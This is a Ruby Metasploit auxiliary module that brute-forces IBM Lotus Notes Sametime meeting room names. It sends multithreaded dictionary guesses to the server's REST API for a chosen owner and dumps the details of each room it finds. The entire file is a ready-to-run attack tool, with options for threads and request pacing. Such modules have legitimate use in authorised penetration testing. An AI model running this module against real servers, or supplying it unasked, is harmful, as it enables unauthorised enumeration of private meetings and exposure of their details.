##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'enumerable'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IBM Lotus Notes Sametime Room Name Brute-Forcer',
      'Description'    => %q{
        This module brute forces Sametime meeting room names via the IBM
        Lotus Notes Sametime web interface.
      },
      'Author'         =>
        [
          'kicks4kittens' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Dec 27 2013',
      'DefaultOptions' =>
        {
          'SSL' => true
        }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('OWNER', [ true,  'The owner to brute-force meeting room names for', '']),
        OptPath.new('DICT', [ true,  'The path to the userinfo script' ]),
        OptString.new('TARGETURI', [ true, 'Path to stmeetings', '/stmeetings/'])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('TIMING', [ true,  'Set pause between requests', 0]),
        OptInt.new('Threads', [ true,  'Number of test threads', 10])
      ], self.class)
  end

  def run
    print_status("#{peer} - Beginning IBM Lotus Notes Sametime Meeting Room Brute-force on #{peer}")
    print_status("Using owner: #{datastore['OWNER']}")

    # test for expected response code on non-existant meeting room name
    rval = Rex::Text.rand_text_alpha(64)
    uri = target_uri.path
    @reqpath = normalize_uri(uri, '/restapi')

    res = send_request_cgi({
      'uri'     =>  @reqpath,
      'method'  => 'GET',
      'ctype'   => 'text/html',
      'vars_get' => {
        'owner' => datastore['OWNER'],
        'permaName' => rval
        }
    })

    unless res
      print_error("#{peer} - No response, timeout")
      return
    end

    if res.code == 404 and res.body =~ /Room does not exist/i
      vprint_status("#{peer} - Server responding to restapi requests as expected")
    else
      print_error("#{peer} - Unexpected response from server (#{res.code}). Exiting...")
      return
    end

    # create initial test queue and populate
    @test_queue = Queue.new
    @output_lock = false

    ::File.open(datastore['DICT']).each { |line| @test_queue.push(line.chomp) }
    vprint_status("Loaded #{@test_queue.length} values from dictionary")

    print_status("#{peer} - Beginning dictionary brute-force using (#{datastore['Threads']} Threads)")

    while(not @test_queue.empty?)
      t = []
      nt = datastore['Threads'].to_i
      nt = 1 if nt <= 0

      if @test_queue.length < nt
        # work around issue where threads not created as the queue isn't large enough
        nt = @test_queue.length
      end

      begin
        1.upto(nt) do
          t << framework.threads.spawn("Module(#{self.refname})-#{rhost}", false, @test_queue.shift) do |test_current|
            Thread.current.kill if not test_current
            res = make_request(test_current)
            if res.nil?
              print_error("#{peer} - Timeout from server when testing room \"#{test_current}\"")
            elsif res and res.code == 404
              vprint_status("#{peer} - Room \"#{test_current}\" was not valid for owner #{datastore['OWNER']}")
            else
              # check response for user data
              check_response(res, test_current)
            end
          end
        end
      t.each {|x| x.join }

      rescue ::Timeout::Error
      ensure
        t.each {|x| x.kill rescue nil }
      end
    end
  end

  def make_request(test_current)

    # make request and return response

    # Apply timing information
    if datastore['TIMING'] > 0
      Rex::sleep(datastore['TIMING'])
    end

    res = send_request_cgi({
      'uri'     =>  @reqpath,
      'method'  => 'GET',
      'ctype'   => 'text/html',
      'vars_get' =>
        {
          'owner' => datastore['OWNER'],
          'permaName' => test_current
        }
    })

  end

  # check the response for valid room information
  def check_response(res, test_current)
    begin
      if res.code.to_i == 200
        json_room = JSON.parse(res.body)
        # extract room information if there is data
        output_table(json_room, test_current) unless json_room.blank?
      end
    rescue JSON::ParserError
      # non-JSON response - server may be overloaded
      return
    end
  end

  def output_table(room_info, test_current)
    unless datastore['VERBOSE']
      print_good("New meeting room found: #{test_current}")
      return
    end

    # print output table for discovered meeting rooms
    roomtbl = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
        'Header'  => "[IBM Lotus Sametime] Meeting Room #{test_current}",
        'Prefix'  => "",
        'Postfix' => "\n",
        'Indent'  => 1,
        'Columns' =>
          [
            "Key",
            "Value"
          ]
      )

    room_info['results'][0].each do |k, v|
      if v.is_a?(Hash)
        # breakdown Hash
        roomtbl << [ k.to_s, '>>' ] # title line
        v.each do | subk, subv |
          roomtbl << [ "#{k.to_s}:#{subk.to_s}", subv.to_s || "-"]  if not v.nil? or v.empty?
        end
      else
        roomtbl << [ k.to_s, v.to_s || "-"]  unless v.nil?
      end
    end
    # output table
    print_good(roomtbl.to_s)

  end

end
